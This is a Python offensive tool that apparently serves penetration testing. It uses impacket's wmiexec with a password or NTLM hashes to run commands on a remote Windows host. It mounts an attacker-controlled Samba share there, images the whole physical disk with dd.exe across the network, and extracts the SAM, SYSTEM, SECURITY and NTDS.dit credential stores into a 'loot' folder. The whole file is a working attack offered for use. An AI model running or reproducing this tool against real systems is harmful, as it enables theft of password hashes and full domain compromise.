import subprocess
import time
import os
import re
import shutil
import argparse
from datetime import datetime
import random
import string
import logging
import sys
import socket
import errno
import netifaces as ni
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import version, smbserver
from impacket.dcerpc.v5 import transport, scmr
from impacket.krb5.keytab import Keytab


cwd = os.path.abspath(os.path.dirname(__file__))
###################COLORS#################
color_RED = '\033[91m'
color_GRE = '\033[92m'
color_YELL = '\033[93m'
color_BLU = '\033[94m'
color_PURP = '\033[35m'
color_reset = '\033[0m'
green_plus = '{}[+]{}'.format(color_GRE, color_reset)
red_minus = '{}[-]{}'.format(color_RED, color_reset)
gold_plus = '{}[+]{}'.format(color_YELL, color_reset)

logging.basicConfig(level=logging.DEBUG)



def setup_share(local_ip, share_name=None, share_user=None, share_pass=None, share_group=None):

    share_name = ''.join(random.choices(string.ascii_lowercase, k=20)) if share_name is None else share_name
    share_user = ''.join(random.choices(string.ascii_lowercase, k=10)) if share_user is None else share_user
    share_pass = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=35)) if share_pass is None else share_pass
    share_group = ''.join(random.choices(string.ascii_lowercase, k=10)) if share_group is None else share_group

    print('\n[Generating share]')
    # making the directory
    print(f'{green_plus} Creating the share folder')
    os.system('sudo mkdir /var/tmp/' + share_name)

    # smb.conf edits
    data = """[{}]
    path = /var/tmp/{}
    public = no
    force user = {}
    force group = {}
    browseable = yes
    create mask = 0664
    force create mode = 0664
    directory mask = 0775
    force directory mode = 0775
    read only = no
    comment = The share
    """.format(share_name, share_name, share_user, share_group)

    # copy old smb.conf file so its safe
    print(f'{green_plus} Backing up the smb.conf file')
    os.system(f'sudo cp /etc/samba/smb.conf {cwd}/')
    print(f'{green_plus} Making modifications')
    with open('/etc/samba/smb.conf', 'a') as f:
        f.write(data)
        f.close()

    # create the user for the share
    # generate the group
    print(f'{green_plus} Creating the group: {share_group}')
    os.system(f'sudo groupadd --system {share_group}')
    # make the user
    print(f'{green_plus} Creating the user: {share_user}')
    os.system(f'sudo useradd --system --no-create-home --group {share_group} -s /bin/false {share_user}')
    # give the user access to the share folder
    print(f'{green_plus} Giving the user rights')
    os.system(f'sudo chown -R {share_user}:{share_group} /var/tmp/{share_name}')
    # expand access to the group
    print(f'{green_plus} Giving the group rights')
    os.system(f'sudo chmod -R g+w /var/tmp/{share_name}')
    # create the smbusers password
    print(f'{green_plus} Editing the SMB password')
    proc = subprocess.Popen(['sudo', 'smbpasswd', '-a', '-s', share_user], stdin=subprocess.PIPE)
    proc.communicate(input=share_pass.encode() + '\n'.encode() + share_pass.encode() + '\n'.encode())
    # restart the smb service
    print(f'{color_BLU}[+]{color_reset} Restarting the SMB service')
    os.system('sudo systemctl restart smbd')

    print('\n[Share Info]')
    print(f'Share Location: /var/tmp/{share_name}')
    print(f'Share User: {share_user}')
    print(f'Share Pass: {share_pass}')
    print(f'Share Group: {share_group}')
    print()
    print('The network Share can be mounted on Windows with the command below:')
    print(f'net use Q: \\\\{local_ip}\\{share_name} /user:{share_user} {share_pass}')

    return share_user, share_group, share_name, share_pass

def create_temp_mount():
    mount_dir = '/tmp/tmpmount'
    if not os.path.exists(mount_dir):
        os.makedirs(mount_dir)
    return mount_dir

def run_fdisk(image_path):
    result = subprocess.run(['sudo', 'fdisk', '--bytes', '-l', image_path], capture_output=True, text=True)
    output = result.stdout
    print(output)
    
    with open('/tmp/fdisk_output.txt', 'w') as f:
        f.write(output)
    return output

def parse_fdisk_output(output):
    device = False
    parselist = []

    for line in output.split('\n') : 
        if line.find('Sector size') != -1:
            line = ' '.join(line.split())
            sector_size_byte = (int(line.split(' ')[6]))
        if device == True and len(line) > 2 : 
            line = line.replace('*','')
            line = ' '.join(line.split())
            parselist.append(int(line.split(' ')[4]))

        if line.find('Device') != -1 :
            device = True


    largest_number = str(max(parselist))

    for line in output.split('\n') : 
        if line.find(largest_number) != -1 :
            line = line.replace('*','')
            line = ' '.join(line.split())
            start_sector_byte = (int(line.split(' ')[1]))
    return sector_size_byte, start_sector_byte


def mount_image(image_path, mount_dir):
    os.system(f'sudo mount -o loop {image_path} {mount_dir}')

def unmount_image(mount_dir):
    if os.path.ismount(mount_dir):
        os.system(f'sudo umount {mount_dir}')
    if os.path.exists(mount_dir):
        os.rmdir(mount_dir)



def create_output_directory(loot_dir=None):
    if not loot_dir:
        now = datetime.now().strftime('%Y%m%d_%H%M%S')
        loot_dir = f'/tmp/{now}_diskloot'
    
    if not os.path.exists(loot_dir):
        os.makedirs(loot_dir)
    
    return loot_dir

def copy_files(mount_dir, loot_dir):
    files_to_copy = [
        'Windows/System32/config/SYSTEM',
        'Windows/System32/config/SECURITY',
        'Windows/System32/config/SAM',
        'Windows/NTDS/ntds.dit'
    ]
    
    for relative_path in files_to_copy:
        src = os.path.join(mount_dir, relative_path)
        name = relative_path.split('/')[-1]
        dest = os.path.join(loot_dir, name)
        if os.path.exists(src):
            shutil.copy(src, dest)
            print(f'Copied {src} to {dest}')
        else:
            print(f'File {src} not found')

def port445_check(interface_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind((interface_ip, 445))
    except socket.error as e:
        if e.errno == errno.EADDRINUSE:
            print(f'{red_minus} Port 445 is already in use')
            sys.exit(0)
        else:
            # something else raised the socket.error exception
            print(str(e))

    sock.close()

def main():
    parser = argparse.ArgumentParser()

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-silent', action='store_true', help='silent mode no banner output or anything')
    parser.add_argument('-share', action='store', default='C$', help='share where the output will be grabbed from '
                                                                     '(default C$)')
    parser.add_argument('-ts', action='store_true', help='adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-unsafe-exec', action='store_true', help='Allows commands to continue running even if a drive is in use when net use was attempted')
    parser.add_argument('-shell-type', action='store', default='cmd', choices=['cmd', 'powershell'], help='choose '
                                                                                                          'a command processor for the semi-interactive shell')

    parser.add_argument('-sharename', action='store', help='Set the name of the attacker share Default=random')
    parser.add_argument('-shareuser', action='store', help='Set the username of the user for the share Default=random')
    parser.add_argument('-sharepassword', action='store', help='Set the password for shareuser Default=random')
    parser.add_argument('-sharegroup', action='store', help='Set the group for shareuser Default=random')
    parser.add_argument('-ip', action='store', help='Your machines IP/interface you want this to run on')
    parser.add_argument('-loot-output', action='store', help='Assign a custom loot directory for your SYSTEM/SECURITY/SAM/NTDS.dit')
    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. '
                                                                            'If omitted it will use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address", help='IP Address of the target machine. If '
                                                                                'ommited it will use whatever was specified as target. This is useful when target is the NetBIOS '
                                                                                'name and you cannot resolve it')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')
    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-localauth', action="store_true", default=False, help='Use local account authentication')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                            'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
    
    args = parser.parse_args()


    domain, username, password, remoteName = parse_target(args.target)
    hashes = args.hashes

    if domain is None:
        domain = ''

    if args.keytab is not None:
        Keytab.loadKeysFromKeytab(args.keytab, username, domain, args)
        args.k = True

    if password == '' and username != '' and args.hashes is None and args.no_pass is False and args.aesKey is None:
        from getpass import getpass

        password = getpass("Password:")

    if args.hashes is not None and args.hashes.find(
            ':') == -1:  # quick check to prevent formatting error with hashes
        args.hashes = ':{}'.format(args.hashes)

    if args.target_ip is None:
        args.target_ip = remoteName

    if args.aesKey is not None:
        args.k = True

    if args.localauth:
        domain = remoteName


    # Validate password or hashes
    if not password and not hashes:
        parser.error('You must provide either a password or NTLM hashes.')

    # Start the Samba server
    if args.ip is not None:  # did they give us the local ip in the command line
        local_ip = args.ip
        ifaces = ni.interfaces()
        iface_ips = []

        for face in ifaces:  # get all interface ips
            try:
                iface_ips.append(ni.ifaddresses(face)[ni.AF_INET][0]['addr'])
            except BaseException as exc:
                continue

        try:  # check to see if the interface has an ip
            if local_ip in ifaces:  # if the given ip is one of our interfaces eg. eth0 ,ensp01
                local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])  # get the ip address of the interface
                print("local IP => {}\n".format(local_ip))
            elif local_ip in iface_ips:  # if they gave us an ip address for -ip eg 10.10.10.10 this ensures that it is our IP were binding to
                print("local IP => {}\n".format(local_ip))
            else:  # if they gave us something incorrect/weird
                print('The interface or IP you specified does not belong to the local machine')
                sys.exit(0)
        except SystemExit:
            sys.exit(0)
        except BaseException as exc:  # if the given interface has no ip we end up here
            print('{}[!!]{} Error could not get that interface\'s address. Does it have an IP?'.format(color_RED, color_reset))
            sys.exit(0)
    else:  # no -ip in options
        # print local interfaces and ips
        ifaces = ni.interfaces()  # get all interfaces
        iface_ips = []

        for face in ifaces:  # get the ip for each interface that has one
            try:
                iface_ips.append(ni.ifaddresses(face)[ni.AF_INET][0]['addr'])
            except BaseException as exc:
                continue

        for face in ifaces:
            try:  # check to see if the interface has an ip
                print('{} {}'.format(str(face + ':').ljust(20), ni.ifaddresses(face)[ni.AF_INET][0]['addr']))  # print(interface:      IP)
            except BaseException as exc:
                continue

        local_ip = input("\nEnter you local ip or interface: ")  # what do they want for their interface

        # lets you enter eth0 as the ip
        try:  # check to see if the interface has an ip
            if local_ip in ifaces:  # if they gave us an interface eg eth0 or ensp01 ensure its ours
                local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
                print("local IP => {}\n".format(local_ip))
            elif local_ip in iface_ips:  # if they gave us an ip ensure its ours
                print("local IP => {}\n".format(local_ip))
            else:  # if they gave us something incorrect/weird
                print('The interface or IP you specified does not belong to the local machine')
                sys.exit(0)
        except SystemExit:
            sys.exit(0)
        except BaseException as exc:  # if they give an interface that has no IP we end up here
            print('{}[!!]{} Error could not get that interface\'s address. Does it have an IP?'.format(color_RED, color_reset))
            sys.exit(0)

    # ensure port 445 is not in use
    port445_check(local_ip)

    share_user, share_group, share_name, share_pass = setup_share(local_ip, args.sharename, args.shareuser, args.sharepassword, args.sharegroup)

    try:
        # Prepare Samba share
        dd_dir = f'/var/tmp/{share_name}/dd'
        os.makedirs(dd_dir, exist_ok=True)
        files_to_copy = ['dd.exe', 'msys-2.0.dll', 'msys-intl-8.dll', 'msys-iconv-2.dll']
        for file in files_to_copy:
            shutil.copy(file, dd_dir)
            print(f'Copied {file} to {dd_dir}')
            os.system(f'sudo chmod 777 /var/tmp/{share_name}/dd/{file}')
        with open(f'/var/tmp/{share_name}/tempbat.bat', 'w') as f : 
            f.write(f'Q:\\dd\\dd.exe if=\\\\.\\Physicaldrive0 of=Q:\\image.img bs=16M  \n net use Q: /delete /yes')
            f.close()
        os.system(f'cat /var/tmp/{share_name}/tempbat.bat')

        # Combined command to run
        command = (
            f'net use Q: \\\\{local_ip}\\{share_name} /user:{share_user} {share_pass}  && Q:\\tempbat.bat'
        )
        print(command)
        if args.hashes is not None : 
            hasheshash = f'-hashes \'{args.hashes}\''
        else : 
            hasheshash = ''

        print(hasheshash, domain, username, password, remoteName)
        if args.hashes != None :
            os.system(f'python wmiexec.py {hasheshash} {domain}/{username}@{remoteName}  \'{command}\'')
        else : 
            os.system(f'python wmiexec.py {domain}/{username}:{password}@{remoteName}  \'{command}\'')

        # Create temporary mount directory
        mount_dir = create_temp_mount()
        image_path = f'/var/tmp/{share_name}/image.img'

        # Run fdisk command and parse output
        fdisk_output = run_fdisk(image_path)
        sector_size, start_byte = parse_fdisk_output(fdisk_output)


        # Calculate offset and mount the largest partition
        offset = start_byte * sector_size
        mount_command = f'sudo mount -o loop,offset={offset} {image_path} {mount_dir}'
        os.system(mount_command)
        print(f'Largest partition mounted to {mount_dir} with offset {offset}')

        # Create output directory
        loot_dir = create_output_directory(args.loot_output)
        print(f'Output directory: {loot_dir}')

        # Copy files from mounted drive to output directory
        copy_files(mount_dir, loot_dir)
        
    finally:
        # Unmount the image and clean up
        unmount_image('/tmp/tmpmount')
        print("Cleaning up SMB configuration...")
        try:
            os.system('sudo systemctl stop smbd')
            print(green_plus + ' Stopped the smbd service')
        except BaseException as e:
            pass
        try:
            os.system('sudo cp ' + cwd + '/smb.conf /etc/samba/smb.conf')
            print(green_plus + ' Cleaned up the smb.conf file')
        except BaseException as e:
            pass

        try:
            os.system('sudo rm ' + cwd + '/smb.conf')
        except BaseException as e:
            pass

        try:
            os.system('sudo userdel ' + share_user)
            print(green_plus + ' Removed the user: ' + share_user)
        except BaseException as e:
            pass

        try:
            os.system('sudo groupdel ' + share_group)
            print(green_plus + ' Removed the group: ' + share_group)
        except BaseException as e:
            pass

        try:
            os.system('sudo mv /var/tmp/{} {}'.format(share_name, cwd))
            print(green_plus + ' Share folder is now in {}/{}'.format(cwd, share_name))
        except BaseException as e:
            pass

        print('{}[-]{} Cleanup completed! If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
        sys.exit(0)

if __name__ == '__main__':
    main()
